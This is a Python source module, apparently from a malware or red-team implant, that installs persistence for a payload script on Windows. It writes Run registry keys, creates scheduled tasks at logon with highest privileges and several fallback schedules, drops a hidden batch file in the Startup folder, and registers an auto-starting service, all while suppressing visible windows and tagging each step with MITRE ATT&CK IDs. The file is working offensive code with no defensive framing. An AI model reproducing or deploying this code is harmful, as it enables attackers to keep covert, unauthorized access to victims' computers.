# Persistence Module
# Implements various persistence mechanisms for maintaining access

import os
import subprocess
import sys
if sys.platform == "win32":
    import winreg
from config import (
    PERSISTENCE_KEY_NAME, SCHEDULED_TASK_NAME, DEBUG_MODE,
    PAYLOAD_SCRIPT, MITRE_TECHNIQUES
)
from core.stealth import stealth_manager

class PersistenceManager:
    """Manages various persistence mechanisms"""
    
    def __init__(self):
        self.current_path = sys.executable
        self.script_path = os.path.abspath(PAYLOAD_SCRIPT)
        self.is_windows = sys.platform == "win32"
        self.installed_methods = []
    
    def install_all_persistence(self):
        """Install multiple persistence mechanisms"""
        success_count = 0
        
        # Registry Run Key persistence (T1547.001)
        if self.install_registry_persistence():
            success_count += 1
            self._log_technique('T1547.001', True, {
                'method': 'registry_run_key',
                'key_name': PERSISTENCE_KEY_NAME
            })
        
        # Scheduled Task persistence (T1053.005)
        if self.install_scheduled_task():
            success_count += 1
            self._log_technique('T1053.005', True, {
                'method': 'scheduled_task',
                'task_name': SCHEDULED_TASK_NAME
            })
        
        if self.install_startup_folder():
            success_count += 1
        
        if self.install_service_persistence():
            success_count += 1
        
        return success_count > 0
    
    def install_registry_persistence(self, key_name=None):
        """Install persistence via registry run key (T1547.001)"""
        if not self.is_windows:
            return False
            
        key_name = key_name or PERSISTENCE_KEY_NAME
        
        try:
            # Try HKCU first 
            if self._install_hkcu_persistence(key_name):
                self.installed_methods.append('hkcu_run_key')
                return True
            
            # Fallback to HKLM if HKCU fails
            if self._install_hklm_persistence(key_name):
                self.installed_methods.append('hklm_run_key')
                return True
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Registry persistence failed: {e}")
                )
        
        return False
    
    def _install_hkcu_persistence(self, key_name):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            command = f'"{self.current_path}" "{self.script_path}"'
            
            winreg.SetValueEx(
                key,
                key_name,
                0,
                winreg.REG_SZ,
                command
            )
            
            winreg.CloseKey(key)
            return True
            
        except Exception:
            return False
    
    def _install_hklm_persistence(self, key_name):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            command = f'"{self.current_path}" "{self.script_path}"'
            
            winreg.SetValueEx(
                key,
                key_name,
                0,
                winreg.REG_SZ,
                command
            )
            
            winreg.CloseKey(key)
            return True
            
        except Exception:
            return False
    
    def install_scheduled_task(self, task_name=None):
        if not self.is_windows:
            return False
            
        task_name = task_name or SCHEDULED_TASK_NAME
        
        try:
            cmd = [
                "schtasks", "/create",
                "/tn", task_name,
                "/tr", f'"{self.current_path}" "{self.script_path}"',
                "/sc", "onlogon",
                "/rl", "highest",
                "/f"  # Force overwrite if exists
            ]
            
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW if self.is_windows else 0
            )
            
            if result.returncode == 0:
                self.installed_methods.append('scheduled_task')
                return True
            
            return self._try_alternative_task_scheduling(task_name)
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Scheduled task persistence failed: {e}")
                )
            return False
    
    def _try_alternative_task_scheduling(self, task_name):
        alternatives = [
            ["schtasks", "/create", "/tn", task_name, 
             "/tr", f'"{self.current_path}" "{self.script_path}"',
             "/sc", "daily", "/st", "00:01", "/f"],
            
            # On system startup
            ["schtasks", "/create", "/tn", task_name,
             "/tr", f'"{self.current_path}" "{self.script_path}"',
             "/sc", "onstart", "/f"],
            
            # On idle
            ["schtasks", "/create", "/tn", task_name,
             "/tr", f'"{self.current_path}" "{self.script_path}"',
             "/sc", "onidle", "/i", "10", "/f"]
        ]
        
        for cmd in alternatives:
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW if self.is_windows else 0
                )
                
                if result.returncode == 0:
                    self.installed_methods.append('scheduled_task_alt')
                    return True
                    
            except Exception:
                continue
        
        return False
    
    def install_startup_folder(self):
        """Install persistence via startup folder"""
        if not self.is_windows:
            return False
            
        try:
            import shutil
            
            # Get startup folder path
            startup_folder = os.path.expanduser(
                r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            )
            
            if not os.path.exists(startup_folder):
                return False
            
            # Create a batch file that runs e script
            batch_name = f"{PERSISTENCE_KEY_NAME}.bat"
            batch_path = os.path.join(startup_folder, batch_name)
            
            batch_content = f'''@echo off
cd /d "{os.path.dirname(self.script_path)}"
"{self.current_path}" "{self.script_path}"
'''
            
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            # Set hidden attribute
            subprocess.run([
                'attrib', '+h', batch_path
            ], capture_output=True)
            
            self.installed_methods.append('startup_folder')
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Startup folder persistence failed: {e}")
                )
            return False
    
    def install_service_persistence(self):
        if not self.is_windows:
            return False
            
        try:
            # Check if we have admin privileges
            if not self._is_admin():
                return False
            
            service_name = PERSISTENCE_KEY_NAME.replace(" ", "")
            
            # Create service using sc command
            cmd = [
                "sc", "create", service_name,
                "binPath=", f'"{self.current_path}" "{self.script_path}"',
                "start=", "auto",
                "DisplayName=", PERSISTENCE_KEY_NAME
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.returncode == 0:
                # Start the service
                subprocess.run([
                    "sc", "start", service_name
                ], capture_output=True)
                
                self.installed_methods.append('windows_service')
                return True
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Service persistence failed: {e}")
                )
        
        return False
    
    def _is_admin(self):
        """Check if running with administrator privileges"""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False
    
    def install_wmi_persistence(self):
        """Install persistence via WMI event subscription"""
        if not self.is_windows:
            return False
        # TODO:   Implement WMI event subscriptions
        try:
            # This requires WMI and is more advanced
            # Implementation would use WMI event subscriptions
            return False
            
        except Exception:
            return False
    
    def remove_persistence(self):
        removed_count = 0
        
        for method in self.installed_methods:
            if method == 'hkcu_run_key':
                if self._remove_registry_persistence(winreg.HKEY_CURRENT_USER):
                    removed_count += 1
            elif method == 'hklm_run_key':
                if self._remove_registry_persistence(winreg.HKEY_LOCAL_MACHINE):
                    removed_count += 1
            elif method.startswith('scheduled_task'):
                if self._remove_scheduled_task():
                    removed_count += 1
            elif method == 'startup_folder':
                if self._remove_startup_folder():
                    removed_count += 1
            elif method == 'windows_service':
                if self._remove_service():
                    removed_count += 1
        
        return removed_count
    
    def _remove_registry_persistence(self, hive):
        try:
            if hive == winreg.HKEY_CURRENT_USER:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            else:
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            
            key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, PERSISTENCE_KEY_NAME)
            winreg.CloseKey(key)
            return True
            
        except Exception:
            return False
    
    def _remove_scheduled_task(self):
        try:
            result = subprocess.run([
                "schtasks", "/delete", "/tn", SCHEDULED_TASK_NAME, "/f"
            ], capture_output=True)
            
            return result.returncode == 0
            
        except Exception:
            return False
    
    def _remove_startup_folder(self):
        try:
            startup_folder = os.path.expanduser(
                r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            )
            batch_path = os.path.join(startup_folder, f"{PERSISTENCE_KEY_NAME}.bat")
            
            if os.path.exists(batch_path):
                os.remove(batch_path)
                return True
                
        except Exception:
            pass
        
        return False
    
    def _remove_service(self):
        try:
            service_name = PERSISTENCE_KEY_NAME.replace(" ", "")
            
            # Stop service
            subprocess.run([
                "sc", "stop", service_name
            ], capture_output=True)
            
            # Delete service
            result = subprocess.run([
                "sc", "delete", service_name
            ], capture_output=True)
            
            return result.returncode == 0
            
        except Exception:
            return False
    
    def _log_technique(self, technique_id, success, details):
        """Log MITRE ATT&CK technique execution"""
        if DEBUG_MODE:
            technique_name = MITRE_TECHNIQUES.get(technique_id, 'Unknown')
            stealth_manager.safe_execute(
                lambda: print(f"Technique {technique_id} ({technique_name}): {'Success' if success else 'Failed'}")
            )

# Global persistence manager instance
persistence_manager = PersistenceManager()